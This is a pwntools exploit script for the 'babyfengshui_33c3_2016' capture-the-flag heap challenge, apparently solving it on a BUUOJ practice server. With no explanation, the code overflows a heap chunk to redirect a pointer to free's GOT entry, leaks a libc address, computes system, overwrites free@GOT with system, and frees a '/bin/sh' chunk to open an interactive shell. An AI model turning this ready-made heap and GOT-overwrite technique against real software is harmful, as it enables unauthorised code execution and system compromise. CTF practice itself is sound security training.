from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23-32/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-32.so"
# p = process([ld_path, "./babyfengshui_33c3_2016"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 26405)
pro = ELF("./babyfengshui_33c3_2016")
libc = ELF(libc_path)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con, t_size, t_con):
    sla("Action: ", "0")
    sla("size of description: ", str(size))
    sla("name: ", con)
    sla("text length: ", str(t_size))
    sla("text: ", t_con)

def free(index):
    sla("Action: ", "1")
    sla("index: ", str(index))

def show(index):
    sla("Action: ", "2")
    sla("index: ", str(index))

def update(index, size, con):
    sla("Action: ", "3")
    sla("index: ", str(index))
    sla("text length: ", str(size))
    sla("text: ", con)


free_g = pro.got["free"]

# chunk overflow
add(0x10, "a", 0x10, "b")   # 0
add(0x10, "a", 0x10, "b")   # 1
free(0)
add(0x20, "a", 0x20, "b")   # 2
pad = b"/bin/sh\x00"+cyclic(0x20-0x8)
pad += p32(0)+p32(0x60)+cyclic(0x58)
pad += p32(0)+p32(0x18)+cyclic(0x10)+p32(0)+p32(0x88)+p32(free_g)
update(2, len(pad), pad)

# leak
show(1)
rud("description: ")
info = u32(rx(4).ljust(4, b"\x00"))
print("hex: ", hex(info))

# count
base = info-libc.sym["free"]
system = base+libc.sym["system"]
print("system: ", hex(system))

# overwrite free_got 
pad = p32(system)
update(1, len(pad), pad)

# attack
free(2)

shell()


